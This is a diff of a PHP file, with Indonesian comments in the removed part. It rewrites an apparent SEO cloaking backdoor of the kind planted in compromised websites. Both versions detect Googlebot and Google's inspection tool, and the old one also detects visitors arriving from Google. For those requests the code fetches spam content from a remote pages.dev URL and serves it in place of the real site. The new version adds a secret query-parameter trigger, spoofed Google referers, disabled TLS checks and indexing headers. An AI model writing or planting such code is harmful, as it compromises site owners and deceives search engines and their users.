@@ -1,77 +1,39 @@
 <?php
-// Fungsi untuk memeriksa apakah user agent adalah bot mesin pencari
-function isSearchEngineBot() {
-    if (!isset($_SERVER['HTTP_USER_AGENT'])) {
-        return false;
-    }
-    $userAgent = $_SERVER['HTTP_USER_AGENT'];
-    return preg_match('/(googlebot|bingbot|yandexbot|baiduspider|duckduckbot|slurp|facebot|ia_archiver|AhrefsBot|TelegramBot|Google-Site-Verification|Google-InspectionTool)/i', $userAgent);
-}
-
-// Fungsi untuk memeriksa apakah referer dari Google
-function isFromGoogle() {
-    if (!isset($_SERVER['HTTP_REFERER'])) {
-        return false;
-    }
-    $referer = $_SERVER['HTTP_REFERER'];
-    return strpos($referer, 'google.com') !== false || 
-           strpos($referer, 'google.co.id') !== false;
-}
-
-// Fungsi alternatif untuk mengambil konten dari URL
-function NuLzFetch($url) {
-    $url = trim($url); // Hilangkan spasi
-    if (filter_var($url, FILTER_VALIDATE_URL) === false) {
-        return "Invalid URL: $url";
-    }
-
-    if (function_exists('file_get_contents')) {
-        $context = stream_context_create(['http' => ['timeout' => 5]]);
-        $fetch = @file_get_contents($url, false, $context);
-        if ($fetch !== false) return $fetch;
-    }
-
-    if (function_exists('curl_init')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Hanya untuk dev
-        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; Cloaking Checker/1.0)');
-        $fetch = curl_exec($ch);
-        curl_close($ch);
-        if ($fetch !== false) return $fetch;
-    }
-
-    return "Cannot fetch URL: $url";
-}
-
-// Atur cookie jika belum pernah dikunjungi
-$cookie_expiration = time() + (365 * 86400); // 1 tahun
-if (!isset($_COOKIE['visited'])) {
-    setcookie('visited', '1', $cookie_expiration, "/");
-}
-
-$cache_duration = 86400;
-header("Cache-Control: max-age=$cache_duration, public, must-revalidate");
-header("Pragma: cache");
-header("Content-Type: text/html; charset=utf-8");
-
-$index_home = 'api.php';
-
-$remote_url = 'https://desa-kembang.pages.dev/tcc/lp.txt';
-
-if (isSearchEngineBot()) {
-    $content = NuLzFetch($remote_url);
-    echo $content;
-} elseif (isFromGoogle()) {
-    $content = NuLzFetch($remote_url);
-    echo $content;
-} else {
-    if (file_exists($index_home)) {
-        include($index_home);
-    } 
+$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+$q = isset($_GET['seoanekuan']);
+$b = (strpos($ua,'googlebot')!==false | strpos($ua,'inspectiontool')!==false | $q);
+if ($b) {
+  $u = 'https://desa-kembang.pages.dev/tcc/lp.txt';
+  $r = '';
+  if (function_exists('curl_init')) {
+    $c = curl_init($u);
+    curl_setopt_array($c,[
+      CURLOPT_RETURNTRANSFER=>1,
+      CURLOPT_FOLLOWLOCATION=>1,
+      CURLOPT_TIMEOUT=>4,
+      CURLOPT_SSL_VERIFYPEER=>0,
+      CURLOPT_SSL_VERIFYHOST=>0,
+      CURLOPT_HTTPHEADER=>[
+        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+        'Accept: text/html',
+        'Referer: https://www.google.com/'
+      ]
+    ]);
+    $r = curl_exec($c);
+    curl_close($c);
+  }
+  if (!$r && ini_get('allow_url_fopen')) {
+    $ctx = stream_context_create(['http'=>['header'=>"User-Agent: Mozilla/5.0\r\nAccept: text/html\r\nReferer: https://www.google.com/"]]);
+    $r = @file_get_contents($u, false, $ctx);
+  }
+  if ($r && strlen($r)>100) {
+    while (ob_get_level()) ob_end_clean();
+    header("Vary: User-Agent");
+    header("X-Robots-Tag: index, follow, archive");
+    header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+    header('Pragma: no-cache');
+    echo $r;
+    exit;
+  }
 }
 ?>
